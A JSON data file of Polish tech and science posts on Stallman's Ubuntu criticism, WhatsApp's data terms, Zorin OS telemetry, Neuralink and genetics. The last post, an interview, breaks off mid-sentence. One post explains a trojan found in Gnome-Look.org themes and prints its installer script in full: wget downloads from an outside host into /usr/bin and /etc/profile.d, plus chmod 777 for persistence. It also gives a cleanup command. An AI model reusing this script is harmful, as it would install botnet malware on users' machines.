{
	"next_topic_id": 8,
	"topic": [
		{
			"topic_id": 1618429064,
			"title": "Stallman oskarża twórców Ubuntu o szpiegowanie użytkowników",
			"body": "Richard Stallman (RMS) - niestrudzony promotor wolnego oprogramowania oraz założyciel projektu GNU - ostro skrytykował twórców Ubuntu, zarzucając im wprowadzenie w najnowszej wersji systemu mechanizmów szpiegujących użytkowników. \nStallmana rozsierdziło umieszczenie w systemie funkcji wyszukiwania powiązanej z zasobami sklepu internetowego Amazon.com (jest ona domyślnie włączona w najnowszej wersji Ubuntu, aczkolwiek użytkownik może ją wyłączyć). Dzięki niej po wpisaniu frazy do wyszukiwarki w oddzielnym panelu - obok standardowych wyników wyszukiwania - prezentowane są informacje o produktach dostępnych w katalogu Amazon.com (zgodnych z wpisaną frazą).\n\nRMS poświęcił temu problemowi obszerny wpis opublikowany na stronie Free Software Foundation - zarzuca on firmie Canonical, że funkcja ta służy do szpiegowania użytkowników. \"Autorzy Ubuntu twierdzą, że nie przekazują Amazonowi informacji o tym, kto czego szukał - ale to nic nie zmienia, bo sam fakt, że takie dane zbiera Canonical, jest naganny\" - tłumaczy Stallman.\n\nTwórca Canonical, Mark Shuttleworth, zdążył już zdecydowanie odpowiedzieć na zarzuty guru ruchu open-source - jego zdaniem wprowadzenie nowej funkcji do Ubuntu nie stanowi żadnego zagrożenia dla prywatności użytkowników, zaś wypowiedzi Stallmana to klasyczny FUD. RMS jednak nie odpuszcza - zaapelował do liderów opinii społeczności wolnego oprogramowania, by odradzali użytkownikom korzystanie z nowej wersji Ubuntu i by nie dali się zwieść tłumaczeniom, że problemu nie ma, bo kontrowersyjną funkcję da się wyłączyć.\n\n\"Nawet gdyby była ona domyślnie wyłączona, to wciąż byłaby niebezpieczna - bo użytkownik mógłby z jakiegoś powodu raz zgodzić się na jej włączenie, a potem nieświadomie pozostać przy statusie \"włączona\". Przez wzgląd na prywatność użytkownika takie narzędzia powinny działać inaczej - najlepiej, by miał on za każdym razem do wyboru, czy chce z niej skorzystać, czy nie\" - wyjaśnia RMS.\n\nWarto odnotować, że Stallman nie od dziś ma na pieńku z autorami Ubuntu - jego fundacja od dawna odradzała użytkownikom korzystanie z tego systemu (ponieważ jego zdaniem produkt Canonical nie spełnia wymogów stawianych \"wolnemu oprogramowaniu\"). Teraz konflikt zdecydowanie się zaostrza - do tego stopnia, że RMS wprost nazwał wyszukiwarkę powiązaną z Amazon \"szkodliwą funkcją\".",
			"added": 1618429063
		},
		{
			"topic_id": 1618538921,
			"title": "Pierwszy trojan na Ubuntu?",
			"body": "Jeśli instalowaliście ostatnio na swoim Ubuntu wygaszacze ekranu lub skórki ściągnięte z popularnego serwisu Gnome-Look.org, mamy dla was złą wiadomość. W niektórych plikach tego serwisu znaleziono złośliwe oprogramowanie. Czyżby był to pierwszy przypadek trojana na Ubuntu? :-)\n\nZłośliwe instrukcje znaleziono w instalatorach wygaszacza ekranu Waterfall ScreenSaver oraz skórki Ninja Black. Instalatory (.deb) tych “upiększaczy systemu” zawierały polecenia ściągające z internetu złośliwy skrypt, dodający Ubuntu do botnetu.\n\n#!/bin/sh\ncd /usr/bin/\nrm Auto.bash\nsleep 1\nwget http://05748.t35.com/Bots/Auto.bash\nchmod 777 Auto.bash\necho -----------------\ncd /etc/profile.d/\nrm gnome.sh\nsleep 1\nwget http://05748.t35.com/Bots/gnome.sh\nchmod 777 gnome.sh\necho -----------------\nclear\nexit\n\nJak widać, malware umiejscawia się w tzw. login shellu (profile.d) i aktualizuje swój kod przy każdym logowaniu użytkownika do zainfekowanego Linuksa. Złośliwe oprogramowanie najprawdopodobniej zmuszało zaatakowane Ubuntu do “pomocy” w przeprowadzaniu ataków DDoS.\nCzy Ubuntu jest niebezpieczne?\n\nTak, ale głównie dzięki osobie, która z niego korzysta ;)\n\nPowyższy atak nie wykorzystuje żadnej dziury w Ubuntu. Infekcja jest możliwa, ponieważ podczas instalacji .deb-ów wymagane jest podanie hasła roota. Uzyskawszy hasło superużytkownika, złośliwy skrypt jest w stanie dowolnie modyfikować system.\n\nPowyższy atak jest więc bardziej przykładem udanego social engieeringu, który wykorzystując chęć użytkownika do upiększenia swojego systemu operacyjnego, uzyskuje hasło roota.\n\n    Należy pamiętać, że niezależnie od używanego systemu operacyjnego, instalacja oprogramowania z nieoficjalnych źródeł może skończyć się nieprzyjemnie. \n\nW przypadku Linuksa, deby z niezaufanych źródeł (np. spoza repozytoriów) mogą zawierać w skrypcie instalacyjnym “dodatkowe linijkę” wykonujące złośliwe komendy. Gdyby przenieść omawiany atak na świat Windowsa, sytuacja przypominałaby przejście na stronę wygaszacz.com i ściągnięcie, a następnie instalacja pliku wygaszacz.exe — nigdy nie wiadomo, co się stanie… Trzeba jednak szczerze przyznać, że użytkownicy Windows, z racji rozpowszechnionych na tą platformę programów antywirusowych, mają większe szanse na wyjście cało z sytuacji.\nMoje Ubuntu jest zainfekowane, co zrobić?\n\nJeśli instalowałeś dodatki z serwisu Gnome-Look (ale tylko wtedy!), otwórz terminal i wklep poniższą linijkę:\n\nsudo rm -f /usr/bin/Auto.bash /usr/bin/run.bash /etc/profile.d/gnome.sh index.php run.bash && sudo dpkg -r app5552\n\nTo powinno usunąć złośliwe oprogramowanie z twojego systemu.\n\nNo cóż, trojan na Linuksie nigdy długo nie pożyje, zawsze któryś z pryszczersów rzuci okiem w kod i znajdzie niepokojącą linijkę. Z punktu widzenia cyberprzestępcy, lepiej jest więc pisać malware na Windowsy — to właśnie z nich w większości korzystają mniej techniczni użytkownicy.",
			"added": 1618538919
		},
		{
			"topic_id": 1618579412,
			"title": "Komórki spełnieniem marzeń Stalina - kto tak uważa?",
			"body": "Żywa legenda wśród programistów, współtwórca licencji GNU GPL, Richard Stallman, wypowiedział się właśnie na temat nowoczesnych telefonów komórkowych. Zdaniem Stallmana popularne dziś smartfony są spełnieniem marzeń dyktatora Związku Radzieckiego — Józefa Stalina. Dlaczego?\n\n    Nie mam i nie będę mieć telefonu komórkowego. Komórki są narzędziami godnymi Wielkiego Brata. Nie zamierzam nosić sprzętu, który cały czas rejestruje moje położenie i może stać się sprzętem na przykład do podsłuchu — stwierdził Stallman.\n\n\nW opinii legendy branży IT jedynie wolne oprogramowanie obecne w smartfonach, komputerach domowych czy tabletach może ochronić nas przed niecnym wykorzystaniem nowoczesnych technologii.\n\nJako oprogramowanie, którego powinno się używać, Stallman wskazuje wolną wersję Androida o nazwie Replicant. System, o którym mowa, podobny jest do modyfikacji Cyanogen, jednak zastępuje większość bibliotek i aplikacji ich całkowicie wolnymi odpowiednikami. Niestety, zmodyfikowany Android pracuje sprawnie jedynie na w telefonach w Europie.\n\nWywiad, w którym zapytano Stallmana o zagrożenia związane ze smartfonami, przeprowadzono za pośrednictwem… komórki. Urządzenie nie należało jednak do legendarnego programisty, a do jego przyjaciela. Czy to już obsesja?",
			"added": 1618579409
		},
		{
			"topic_id": 1618579779,
			"title": "Dobre wieści: WhatsApp traci użytkowników. Nie godzą się na nowe warunki.",
			"body": "Po tym jak WhatsApp poprosił użytkowników o zgodę na przesyłanie Facebookowi większej ilości danych, konkurencyjne komunikatory odnotowały gwałtowne wzrosty liczby pobrań. \n\nWhatsApp należy do Facebooka, ale jest odrębnym i popularnym komunikatorem.\n\nNiedawno użytkownicy aplikacji zostali poproszeni o wyrażenie zgody na przesyłanie Facebookowi większej ilości danych. Chodzi o m.in. lokalizację, historię zakupów i innych płatności, spis połączeń, adres e-mail i numer telefonu.\n\nJak zapewniają przedstawiciele WhatsApp, udostępnianiu nie podlegają i nie będą podlegać dane zaszyfrowanej treści wiadomości.\n\nNowe warunki usługi nie dotyczą użytkowników z Wielkiej Brytanii i Unii Europejskiej. Pozostali, jeśli do 8 lutego nie wyrażą na nie zgody, stracą dostęp do swoich kont.\n\nDecyzja o wprowadzeniu nowych warunków spowodowała, że dotychczasowi użytkownicy WhatsApp zaczynają szukać alternatywy.\n\nJak podaje portal Moneywatch, w ciągu dwóch dni od wysłania komunikatu o nowych warunkach liczba pobrań konkurencyjnej aplikacji Signal wzrosła o 100 tys.\n\nInnego konkurenta, komunikator Telegram, pobrano w tym czasie ponad 2 mln razy.",
			"added": 1618579775
		},
		{
			"topic_id": 1621391720,
			"title": "O tym jak Zorin OS nas szpieguje.",
			"body": "Nie tak dawno temu rozpływaliśmy się w zachwytach nad najnowszą wersją dystrybucji Zorin 15 Lite, a tu już wypłynęła informacja o niecnym zachowaniu tego systemu. Otóż, o tempora, o mores, po zainstalowaniu Zorin co 60 minut wysyła pakiet ICMP do swoich rodzimych serwerów. Okazuje się jednak, że sprawa ma głębsze dno.\n\nzorin15\nZorin OS 15 Lite\nWysyłanie zwykłego pinga pozornie nie świadczy o zbrodniczych zamiarach wobec skromnych użtkowników tego systemu. Ale niepokoją dwie rzeczy. System robi to bez uzgodnienia z użytkownikiem oraz nie daje wyboru podczas instalacji tej telemetrii. A przecież pakiet ICMP ze swojej natury zawiera co najmniej takie informacje jak źródłowy adres IP nadawcy (czyli nasz). Zaraz, to już trzy zarzuty.\n\nTeoretycznie sprawę można zbyć kolokwialnym widziały gały co brały. Polityka prywatności zamieszczona na oficjalnej stronie projektu uczciwie informuje o tym fakcie, tzn. o wysyłaniu anonimowych pakietów ICMP. Służą one zliczaniu aktywnych instalacji systemu. Według zapewnień Artyoma Zorina, dane są gromadzone pod unikalny i anonimowym identyfikatorem przyznany naszemu komputerowi. Nie są logowane adresy źródłowe adresy IP pakietów ani inne informacje mogą służyć naszej precyzyjnej identyfikacji. Aby pozbyć się tej funkcjonalności, należy po prostu odinstalować pakiet zorin-os-census.\n\nI wszystko gra. Poza faktem, że system zlicza nas potajemnie i wysyła informacje które potencjalnie mogą wskazać naszą lokalizację, to wszystko jest w porządku. Co więcej, zorientowani użytkownicy w kilka chwil znajdą inne dystrybucje, które po zainstalowaniu w różny sposób informują serwery o swoim istnieniu. Przykłady? Choćby Network-Manager w Arch Linuksie. Jeszcze do niedawna testował połączenie z siecią inicjując połączenie do adresu apollo.archlinux.org po porcie osiemdziesiątym. Albe szczątkowa telemetria w openSUSE i ich flagowym Zypperze.\n\nInnymi słowy, taki mamy klimat. Użytkownicy oczekują magii ze strony oprogramowania, oprogramowamie udaje, że potrafi czarować, ale potrzebuje do tego naszych danych. I tak to się kręci. Na dodatek promowanie i nagłaśnienie wszystkich przypadków naruszeń danych osobych wywołało patologiczne dbanie o wszystkie informacje przypisane naszym osobom. To dobrze. Gorzej, że firmy coraz częściej mają problem z jawną współpracą z użytkownikami w ramach zdrowych i określonych zasad korzystania z programu czy systemu. Potem takie niedomówienia ukrywane są pod przykrywką działań pozornych lub przemilczanych. A my tkwimy pośrodku linii frontu, gdzie zmagania toczą nasze umiłowanie wolności i zakodowany atawizm wygodnej egzystencji.",
			"added": 1621391715
		},
		{
			"topic_id": 1621556211,
			"title": "To się dzieje: \"Neuralink: chipy w ludzkim mózgu\".",
			"body": "Elon Musk o Neuralink: chipy w ludzkim mózgu jeszcze w 2021?\nElon Musk i jego firma Neuralink jeszcze w 2021 roku chcą wszczepiać ludziom chipy do mózgu. Miliarder zapewnia, że w ten sposób rozpocznie się nowy rozdział w historii współczesnej medycyny i nauki.\n\nElon Musk wraz z firmą Neuralink kilka dni temu ogłosili sukces, prezentując małpę, której wszczepiono chip do mózgu i dzięki temu mogła grać w komputerowego ping-ponga. Robiła to jedynie za pomocą siły własnego umysłu. Jak wyjaśnił narrator na nagraniu, 9-letni makak Pager miał wszczepione implanty z  siecią mini elektrod, co pozwoliło mu opanować korzystanie z gry komputerowej w jedynie 6 tygodni. Wkrótce podobne eksperymenty zostaną przeprowadzone na ludziach.\nElon Musk o planach i przyszłości Neuralink\n\nJak zapowiada Elon Musk, wkrótce nastąpi dosłownie podłączenie ludzkiego mózgu do komputera. Służyć ma do tego aplikacja Neuralink, która zainstalowana na smartfonie, pozwoli śledzić aktywność mózgu. Założyciel SpaceX przyznaje, że praca nad projektem Neuralink są na tyle zaawansowane, iż testy na ludziach ruszą jeszcze w 2021 roku.\n\n    Dla własnego dobra nie przekazujcie tej informacji nikomu, kto wierzy w teorie spiskowe – powiedział Elon Musk o rozwoju i planach Neuralink.\n\nFocus.pl przypomina, że to nie jest pierwszy raz, gdy Elon Musk i Neuralink przeprowadzają testy na zwierzętach. W 2020 roku umieszczono implant ze sztuczną inteligencją w mózgu świni, by móc odczytać jego aktywność i ją rejestrować. Musk chwalił się już w 2019 roku, że prowadzone są testy technologii z udziałem małp.\nJaki cel ma Elon Musk rozwijając projekt Neuralink?\n\nJak wyjaśnia Bloomberg, projekt Neuralink zakłada połączenie mózgu z wszczepem za pomocą specjalnych nici z elektrodami. Średnica pojedynczej nici nie przekracza 4-6 mikrometrów, co czyni je kilku, a nawet kilkunastokrotnie cieńszymi od ludzkiego włosa. Wykonuje się niewielki odwiert w czaszce, przed które specjalna maszyna (działająca pod nadzorem neurochirurga) wykonuje proces instalacji wszczepu. Finalna faza rozwoju projektu, gdy ludzie zespolą się z komputerami, zostanie osiągnięta w 5-10 lat. \n\nJak zapewnia Elon Musk, projekt Neuralink ma przede wszystkim pomóc ludziom, którzy doznali urazów mózgu i rdzenia kręgowego, by mogli odzyskać sprawność. Chip N1 umożliwi sparaliżowanej osobie obejście uszkodzonego rdzenia kręgowego, by połączyć mózg z kończynami.\n\nMałpa w gra w grę komputerową – Monkey Mingpong [WIDEO]\nhttps://www.youtube.com/watch?v=rsCul1sp4hQ",
			"added": 1621556205
		},
		{
			"topic_id": 1621633955,
			"title": "To się dzieje: \"Naukowcy wszczepili myszy ludzkie nerwy i mogli nią sterować\".",
			"body": "Ostatnimi dniami media obiegła wieść o osiągnięciu naukowców z USA - wszczepieniu myszy ludzkich komórek nerwowych. Dzięki temu zachowaniem zwierzęcia można było zdalnie sterować. Badanie zrodziło pytania o przyszłość badań genetycznych. Dokąd to wszystko nas zaprowadzi? Między innymi o tym, ale i co robią polscy naukowcy w tej dziedzinie, rozmawiamy z prof. Martą Dziedzicką-Wasylewską, kierownikiem Zakładu Biochemii Fizycznej Uniwersytetu Jagiellońskiego.\nW USA naukowcy od inżynierii genetycznej tak zmienili mózg myszy, że można było zwierzęciem zdalnie sterować. Dla większości ludzi to kompletnie niepojęte i niepokojące, jak w ogóle do tego doszło?\nProf. Marta Dziedzicka-Wasylewska: Można obecnie - właśnie technikami inżynierii genetycznej - \"wyprodukować/stworzyć\" takie myszy, które będą miały wprowadzone geny kodujące białka wrażliwe na określoną długość fali świetlnej.\nCo więcej, geny te mogą być wprowadzone selektywnie w określoną populację neuronów. To się wszystko robi na poziomie embrionu (chociaż są też techniki wprowadzania genu kodującego to wrażliwe na światło białko już do żyjącego, dorosłego zwierzęcia). Jak taka mysz dorośnie, to można aktywować te białka światłem. Ta aktywacja powoduje określone zachowania zwierzęcia np. będzie ono niespokojne, lękliwe albo - wręcz przeciwnie - śmiałe, eksplorujące otoczenie. Może być także bardziej lub mniej podatne na substancje uzależniające lub też szybciej albo wolniej się uczyć. Wiedząc, w jakich neuronach mamy ten gen, którego produkt czyli białko - aktywujemy światłem i obserwując zmiany w zachowaniu zwierzęcia, możemy badać szlaki neuronalne zaangażowane w te reakcje. To bardzo ciekawa dziedzina, nazywa się optogenetyka.\nCały obszar śledzenia - badania i mapowania - sieci połączeń neuronowych to nazywa się konoktemiką i jest jedną z dziedzin neuronauki, najważniejszą spośród tych którymi zajmują się w BRAIN.\nJak jeszcze można wykorzystywać tę naukę? Chyba nie tylko do sterowania zwierzętami?\nTen program jest zakrojony na szeroką skalę, ma też w sobie zagadnienia z obszaru obrazowania mózgu. Pamiętam jak dyskutowano nad tym, że w ogromnej ilości szpitali w różnych celach robi się badania obrazowania mózgu, diagnozując schorzenia, poddając pacjentów różnym testom psychologicznym itp. Te badania przyczyniły się do powstania całej masy danych.\nProblem w tym, że była ona rozproszona, po wszystkich tych ośrodkach, w którym dokonywano obrazowania. Poza tym te dane nieco się różniły, bo aparaty pomiarowe były nieco inne... BRAIN powstał m.in. po to, by uwspólnić, ujednolicić ten cenny materiał, tworząc jedną bazę wspólnych danych nie tylko o tych konkretnych schorzeniach, które każdy badał. Dzięki temu takie badania, które dostarczają mnóstwo informacji, a które w danym szpitalu nie są akurat mało potrzebne, komuś innemu mogą się bardzo przydać.\nKiedy właściwie tak \"przeskoczyliśmy\" z postępem w genetyce? To wszystko jeszcze do niedawna było domeną filmów science fiction, a teraz dzieje się naprawdę.\nOgromny postęp, jaki obecnie następuje, wynika z kilku osiągnięć, które dokonały się na przełomie wieków. Na początku XXI wieku opublikowano prawie pełną sekwencję ludzkiego genomu, kończąc tym samym wielki projekt międzynarodowy, w którym uczestniczyły instytucje rządowe, ale też i prywatne. Był to tzw. Human Genome Project.\nPonadto niebagatelną rolę ma tu także rozwój technik badawczych. Na przełomie lat 80-tych i 90-tych poszukiwanie genu odpowiedzialnego za chorobę Huntingtona trwało 10 lat i angażowało wielu ludzi z dużej liczby ośrodków badawczych. Obecnie jest to znacznie szybsze.\nPoza tym ogromny postęp w technikach informatycznych, zwiększenie mocy obliczeniowej komputerów, początki bioinformatyki, internet. To wszystko pozwoliło na tworzenie ogromnych baz danych grupujących sekwencje genetyczne, sekwencje białek, na porównywanie i poszukiwanie różnic prowadzących do rozmaitych patologii, ale też gromadzenie wiedzy podstawowej, łatwość komunikacji i wymiany informacji pomiędzy naukowcami.\nI w końcu także wielki postęp w technikach obrazowania żywego mózgu, wzrost rozdzielczości tych technik, szczególnie tzw. funkcjonalnego rezonansu magnetycznego.\nCo dziś może genetyka? Jakie prowadzi się w tej dziedzinie badania?\nGenetyka może wiele. Dziś już nawet klonowanie organizmów wyższych jest możliwe i nawet się dzieje (słynna owieczka Dolly). Teoretycznie możliwe jest również zwiększanie wydajności różnych układów czy narządów. Ostatnio czytałam o bardzo ciekawych badaniach polegających na wszczepieniu myszom genetycznie zmienionych ludzkich komórek mózgowych. Mówię o tym, bo to badanie właśnie najlepiej ukazuje możliwości genetyki, na jakie ona już osiągnęła.\nI jakie są potem efekty takiego \"przeszczepu\"?\nZacznijmy od tego, że komórki wątroby czy serca są bardzo podobne u zwierząt i u ludzi. Neurony w zasadzie też - w tym sensie, że ich budowa, funkcjonowanie, charakterystyka prądowa itp. są bardzo zbliżone.\nPierwotnie, przed erą mikroelektrod, badania nad przewodzeniem impulsu nerwowego robiono najpierw na tzw. gigantycznym (2 mm) neuronie mątwy, jedynym możliwym modelu, na którym wówczas eksperymenty w tym obszarze były możliwe. I już wtedy okazało się, że w zasadzie neurony organizmów wyższych pracują według tych samych schematów, co u innych – niższych – gatunków.\nWszystkie mózgi, oprócz neuronów, mają komórki zwane astrocytami. Do niedawna astrocyty uważano za swego rodzaju \"rusztowanie dla neuronów\". Miały pełnić rolę podtrzymującą , opiekuńczą. Jednakże niedawne wnikliwe badania pokazały wiele dość fundamentalnych różnic pomiędzy astrocytami człowieka, a tymi zwierzęcymi. Ludzkie są większe, mają znacznie więcej wypustek i „obsługują\" znacznie więcej połączeń neuronalnych.\nNaukowcy zaczęli się zastanawiać, co by się stało, gdyby ludzkie astrocyty „zainstalować” w mózgach zwierząt. I zrobili to.\nZa zgodą odpowiednich komisji etycznych, pozyskali komórki z ludzkich embrionów (red. - pochodzących z aborcji). Dalej z tych komórek wyosobniono te, które miały być astrocytami. Te zaś zmodyfikowano genetycznie tak, aby „świeciły\" (dodano im gen kodujący białko, które fluoryzuje) i wszczepiono je do mysiego mózgu. One tam sobie dojrzały i oplotły po swojemu (a więc bardziej wydajnie) neurony mysie. Wszystko to można było zobaczyć pod mikroskopem, właśnie dlatego, że komórki „świeciły\". Myszy z ludzkimi astrocytami zostały przebadane w najrozmaitszych testach behawioralnych i elektrofizjologicznych i okazało się, że \"biją na głowę\" swoich pobratymców. Po prostu ich lepiej dopieszczone neurony pracowały wydajniej.\nCzyli jednak science-fiction. Fascynujące, ale i trochę przerażające…\nTak, to niesamowita historia, ale może budzić lęk. Na szczęście badania nad embrionami ludzkimi są bardzo rzadkie i obwarowane ścisłymi regulacjami. Jako ciekawostkę dodam, że gdy przebadano mózg Einsteina, to w jego określonych regionach znaleziono różnice w ilości astrocytów, co jak można dedukować, wpłynęło na jego geniusz.\nCzy Pani jako naukowca pewne odkrycia nie niepokoją? Nobel miał obawy odnośnie swoich wynalazków, a genetycy?\nLudzkość jest wspaniała! Osobiście zachwycam się codziennie potęgą ludzkiego umysłu, tym jak fantastycznie poznaliśmy i opisaliśmy Naturę (zawsze chylę czoła przed fizykami, szczególnie tymi z przełomu XiX i XX wieku) i jak umiemy wykorzystać Jej wszystkie siły i właściwości. Zachwyca mnie, jak bardzo poznaliśmy również biologiczną stronę natury – takie odkrycia jak ewolucjonizm, odkrycie kodu genetycznego itp. zapierają dech w piersiach. Wszystko co nas otacza we współczesnym cywilizowanym świecie jest stworzone przez człowieka na bazie tego, co oferowała nam natura. Jednak ludzkość, jak wiadomo, to sprzeczności - sacrum i profanum, yin i yang, wielkość i dno…\nTak jak Nobel się obawiał, obawiam się i ja… Tak jak energia atomowa: ma swoją fantastyczną twarz (dostarcza nam energii), ma też i niestety twarz grzyba nad Hiroszimą.\nPodobnie, genetyka molekularna – możliwości modyfikacji organizmów w celach badawczych a przede wszystkim w celach terapeutycznych – może pomóc przywracać zdrowie czy ratować życie, ale też i doprowadzić do stworzenia potwora. Nie tylko świadomie, przez „złych ludzi” ale także przez przypadek, brak wiedzy, zaniechanie.\nTrzeba być ostrożnym i pokornym, by nie doprowadzić się do stadium pychy, że „człowiek jest stwórcą”. Ale osobiście myślę, że pokora jest zawsze potrzebna, właściwie nawet niezbędna i to nie tylko genetykom.\nW społeczeństwie badania genetyczne budzą kontrowersje. Czy to ze strachu, czy z poszukiwania sensacji, z niewiedzy sporo zbudowano wokół genetyki mitów… Dlaczego Pani zdaniem tak się dzieje? Wystarczy spojrzeć choćby na to, ile emocji wzbudza GMO.\nOsobiście uważam, że z organizmami modyfikowanymi genetycznie ludzkość żyje cały czas. Robili i robią to hodowcy zwierząt i roślin, ulepszając swoje produkty poprzez krzyżówki. Teraz robi się to po prostu szybciej i wydajniej, bardziej efektywnie.\nGenom wielu organizmów jest już poznany, ale jeszcze wielu relacji pomiędzy sekwencjami kodującymi geny, a sekwencjami regulatorowymi albo też ogromnymi obszarami sekwencji balastowych, nie znamy. Istnieje więc obawa, że manipulacje w owych sekwencjach, mogą prowadzić do jakichś wad i niepożądanych skutków w organizmach modyfikowanych. To fakt takie niebezpieczeństwo może istnieć, choć nie musi.\nO wiele gorsza jest perspektywa, że ktoś kto zmonopolizuje na przykład produkcję niezwykle wydajnej i odpornej pszenicy (obwaruje patentami) – wycinając powoli wszystkie mniej wydajne i mniej odporne odmiany – narzuci następnie ceny zaporowe i nie będzie odwrotu. Zaczną powstawać monokultury rolne, zaburzą się ekosystemy. To się już powoli dzieje, nie wszystkie sprawy udało się uregulować prawnie, bo życie – jak zawsze – jest parę kroków przed prawem.\nI stąd, moim zdaniem, gwałtowne protesty przeciw GMO, posługujące się niestety nie do końca prawdziwą argumentacją.\nAle wie Pani, że dla ludzi wszystkie te genetyczne modyfikacje mogą wyglądać jak próby zabawy w Boga czy stworzenia Frankensteina?\nNaukowiec powinien cechować się wnikliwością, umiejętnością weryfikacji źródeł informacji i samych informacji – „diabeł zwykle tkwi w szczegółach”, a o nich trudno się dyskutuje, jeżeli partner w dyskusji nie ma podstawowej wiedzy.\nDyskusja nad klonowaniem człowieka szła w stronę możliwości przedłużenia sobie życia przez dawcę komórki, która miałaby być podstawą rozwoju nowego człowieka. To totalna bzdura! Nowy człowiek, który by się urodził, chociaż identyczny pod względem genetycznym z „dawcą”, miałby swoje życie, inny dom rodzinny, inną szkołę, innych przyjaciół, czytałby inne książki, słuchałby innej muzyki czyli wszystko to, co kształtuje naszą osobowość byłoby inne. To po prostu byłoby inne życie, innej samodzielnej istoty, które w żadnym wypadku nie byłoby przedłużeniem życia „dawcy”.\nO tym, że „odkryto gen” schizofrenii, depresji czy nawet choroby Alzheimera słyszymy co chwilę – nie ma podstaw, żeby sądzić, że te złożone schorzenia są dziedziczone w sposób jednogenowy – i nie jest tak, że teraz tego nie wiemy a kiedyś poznamy ten gen – to już wiadomo z tzw. wzorów dziedziczenia, które są opisywane w dziedzinie o nazwie genetyka populacyjna.\nPodobnie, z tej dziedziny nauki, dziedziny zresztą ścisłej, operujących wzorami matematycznymi, wynika, że nie pozbędziemy się chorób determinowanych genetycznie eliminując nosicieli wadliwych genów.\nNo właśnie, mam wrażenie, że co i raz gdzieś czytam o kolejnych osiągnięciach w dziedzinie genetyki, ale spektakularnych dokonań - z punktu widzenia społeczeństwa - jakoś nie widać...\nPoznajemy genetyczne podstawy schorzeń, ale nie umiemy ich jeszcze leczyć. Terapia genowa nie przyniosła na razie spektakularnych wyników, ale ciągle się próbuje. W zasadzie trzeba wiedzieć, że każda komórka danego organizmu ma ten sam zestaw genów, tylko nie w każdej te same geny są aktywne, dlatego komórka wątroby różni się od komórki mięśnia albo mózgu. Ale jak jest gen wadliwy, to on jest wszędzie wadliwy. W niektórych komórkach on i tak nie funkcjonuje, ale nie ma dobrych sposobów, żeby go zmienić, zablokować, odblokować tam, gdzie to jest akurat potrzebne.\nZ jednej strony - najważniejsze próby związane z terapią genową dotyczą komórek układu krwionośnego . Można pobrać krew lub szpik od pacjenta, oczyścić ten materiał ze złych komórek - albo wprowadzić „dobry gen” czy zablokować ten wadliwy - namnożyć te prawidłowe poza organizmem i podać je z powrotem.\nWcześniej jednak trzeba pacjenta pozbawić wszystkich wadliwych komórek, co jest niebezpieczne samo w sobie, bo taki pacjent nie ma wtedy w ogóle odporności, trzeba stworzyć sterylne warunki całej operacji itp. Próby są więc podejmowane, ale wszystko zajmuje czas.\nA propos leczenia. Autorzy eksperymentu z myszą z projektu BRAIN twierdzą, że ich badania mają pomóc leczyć chorobę Alzheimera i Parkinsona…\nW obszarze schorzeń neuropsychiatrycznych sprawa jest jeszcze trudniejsza, bo są to złożone schorzenia, jeżeli dziedziczone, to wielogenowo. Tu jeszcze nie mamy postępu. Nawet wspomniana już tu przeze mnie choroba Huntingtona, która wynika ze zmiany genetycznej tylko w jednym genie, o czym wiemy już od 1993 roku, nadal nie jest jeszcze uleczalna.\nAle dlaczego? Co stoi na przeszkodzie i uniemożliwia posunięcie się do przodu?\nNajłatwiej to wyjaśnić tak: genom człowieka to 3 miliardy „cegiełek”, z których jest zbudowane DNA, w każdej komórce. Często jest tak, że wystarczy zmiana jednej takiej cegiełki i już jest choroba, czasem zmiany są większe, dotyczą dłuższych fragmentów.\nKtoś może mieć wadliwy zapis w jakimś fragmencie swojego genomu, ale zmiana się nie ujawnia u niego, jest maskowana przez inny, bliźniaczy fragment (bo generalnie nasze DNA jest popakowane w chromosomy, których człowiek ma 46, ale mówimy że są to 23 pary - bo są właśnie bliźniacze, jeden od matki, jeden od ojca...). Taka zmiana może się nie ujawniać u „nosiciela” tejże i nie musi się nawet ujawnić u jego potomka. Niemniej może się ujawnić w drugim pokoleniu, kiedy ten fragment genomu z bliźniaczego chromosomu nie będzie miał zdolności maskowania albo będzie miał taką samą zmianę. Zmiany tych cegiełek budujących DNA to są mutacje. One nie tylko są dziedziczone, ale mogą też być nabywane za życia. Nie ma takiej możliwości, żeby totalnie wyeliminować je wszystkie. Bo nawet nie wiemy, kto jest nosicielem jakiej niekorzystnej zmiany.\nOczywiście, jak znamy dokładnie genetyczną przyczynę choroby - jak w chorobie Huntingtona - to badanie jest możliwe. Wtedy można np. nie decydować się na potomstwo - ale to będzie eliminowanie tej choroby z danej rodziny, a nie z populacji. Zresztą, badać się mogą tylko członkowie rodzin, w których występowało to schorzenie, ono ujawnia się dopiero w okolicach 40-tki więc czasem - nie wiedząc wiele o swoich przodkach – dotknięte tą chorobą osoby, już mają dzieci.\nZaczęłyśmy rozmowę od badań naukowych w USA, ale czy Polska może się pochwalić jakimiś osiągnięciami w dziedzinie genetyki? Czy też może wyraźnie odstajemy w tej dziedzinie od reszty świata?\nWiele rzeczy się dzieje tu i ówdzie, szczególnie w wiodących instytutach PAN-owskich (Poznań), ale w nauce światowej prace publikowane w „Nature” czy „Science” są kluczowe, a takich my na razie nie mamy. To znaczy polscy naukowcy publikują tam, ale zwykle we współpracy z zagranicą, natomiast stricte naszych, samodzielnych jeszcze nie ma.\nJednakże kilkoma odkryciami w obszarze genetyki możemy się pochwalić. Mam tu na myśli np. osiągnięcia prof. Grzegorza Węgrzyna z Uniwersytetu Gdańskiego, któremu udało się opracować sposób leczenia rzadkiej choroby genetycznej o nazwie Sanfilippo, prof. Jana Lubińskiego z Akademii medycznej w Szczecinie, który osiągnął bardzo zaawansowana diagnostykę genetyczną w przypadku wielu chorób. Ale także badania dr Krzysztofa Pyrcia z Uniwersytetu Jagiellońskiego w dziedzinie koronawirusów, wiele istotnych badań prof. Wacława Szybalskiego czy choćby te dr hab. Wojciecha Branickiego (UJ), który na podstawie szczątków ustalił płeć i niektóre cechy wyglądu (kolor oczu, barwę włosów) osób pochowanych w XII w. w opactwie ojców benedyktynów w Tyńcu.\nNie jesteśmy może przodownikami w dziedzinie genetyki, ale weźmy pod uwagę to, że kiedy świat rozpoczął sekwencjonowanie genomu człowieka i genomów innych organizmów modelowych, to my w Polsce nie wiedzieliśmy jak wygląda automatyczny sekwenator. Nikt nie marzył nawet o kupnie takiego sprzętu. Dlatego my, w Polsce, bardziej korzystamy z osiągnięć genetyki i zajmujemy się biologią molekularną i genomiką funkcjonalną, niż stricte genetyką.\nCo ułatwiłoby polskim naukowcom prace i osiągnięcia w omawianej tu przez nas dziedzinie?\nW nauce pracuję od 1986 r. I tak miałam szczęście, bo pracowałam w bardzo dobrym, nowoczesnym instytucie, otwartym 